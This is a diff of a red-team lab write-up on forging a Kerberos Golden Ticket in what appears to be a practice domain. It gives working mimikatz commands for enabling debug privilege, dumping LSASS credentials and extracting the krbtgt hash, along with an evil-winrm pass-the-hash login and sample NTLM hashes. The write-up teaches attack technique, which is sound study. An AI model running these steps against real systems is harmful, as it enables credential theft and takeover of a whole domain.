@@ -54,15 +54,104 @@ Whoever controls its hash essentially controls the entire domain
 Golden Tickets do not need network access to generate — everything is done locally
 Detection is difficult because the ticket looks completely legitimate to the DC
 
-# Step 1 — Getting a Shell on the Domain Controller
 
-First I logged into the Domain Controller using the Administrator hash I dumped earlier from the NTDS.dit file.
+# Step 1 - Download mimikatz_trunk.zip in kali
+
+First I downloaded mimikatz_trunk.zip from github in kali and then transfer it to dc.
+then I unzip mimikatz_trunk.zip file on dc. 
+
+
+# Step 2 - run mimikatz.exe
+
+After that I open cmd and run mimikatz.exe file.
 
 ```bash
-evil-winrm -i 192.168.5.134 -u 'administrator' -H 'fc525c9683e8fe067095ba2ddc971889'
+C:\Users\Administrator\Downloads>mimikatz.exe
 ```
-Once inside I had a full PowerShell session as Domain Administrator.
 
-# Step 2 — Dumping the krbtgt Hash with Mimikatz
+**Output:**
 
-Now I uploaded Mimikatz to the machine and ran it to pull the krbtgt hash and the domain SID.
+```text
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+  mimikatz #
+  ```
+
+### Enable Debug Privilege
+
+```bash
+mimikatz # privilege::debug
+```
+**Output:**
+
+```text
+Privilege '20' OK
+```
+
+`Privilege '20' OK` means Mimikatz successfully got **SeDebugPrivilege** — this allows it to access memory of other processes including LSASS which holds all the credentials.
+
+# Step 3 - Dumping Credentials from Memory
+
+```bash
+sekurlsa::logonpasswords
+```
+
+This command tells Mimikatz to dig into LSASS process memory and pull out all the credentials Windows is storing there.
+
+LSASS (Local Security Authority Subsystem Service) is a Windows process that handles all logins. Every time someone logs into the machine, Windows keeps their credentials in LSASS memory to keep the session running. Mimikatz reaches into that memory and pulls everything out.
+
+**Output:**
+
+```
+Authentication Id : 0 ; 910653 (00000000:000de53d)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : READTEAMBD
+Logon Server      : REDTEAMBD-DC
+Logon Time        : 6/6/2026 11:07:52 AM
+SID               : S-1-5-21-2745015721-426968701-4006811760-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : READTEAMBD
+         * NTLM     : fc525c9683e8fe067095ba2ddc971889
+         * SHA1     : e53d7244aa8727f5789b01d8959141960aad5d22
+         * DPAPI    : 254d7e38c7b4a507b03f747b5177a2af
+```
+
+### Credentials Recovered
+
+| User            | Domain       | NTLM Hash                          |
+|-----------------|--------------|------------------------------------|
+| `Administrator` | `READTEAMBD` | `fc525c9683e8fe067095ba2ddc971889` |
+| `REDTEAMBD-DC$` | `READTEAMBD` | `5d61398d1bb36494251624d87522d005` |
+
+Got the Administrator NTLM hash sitting right in memory. No cracking needed — I can use this directly for Pass the Hash.
+
+<p align="center">
+  <img src="/writeups/golden ticket/images/Screenshot_4.png" width="600">
+</p>
+
+## Dumping krbtgt Hash
+
+```bash
+mimikatz # lsadump::lsa /inject /name:krbtgt
+```
+
+### Flag Breakdown
+```
+| Flag           | Description                                               |
+|----------------|-----------------------------------------------------------|
+| `lsadump::lsa` | Dumps credentials from the LSA (Local Security Authority) |
+| `/inject`      | Injects into the LSASS process to extract data            |
+| `/name:krbtgt` | Targets specifically the `krbtgt` account                 |
+```
+
+### What This Does
+
+Instead of dumping all accounts like `lsadump::lsa /patch`, this command goes after one specific account — `krbtgt`. This is the account I need to forge a Golden Ticket. It gives me the NTLM hash and the domain SID in one shot.
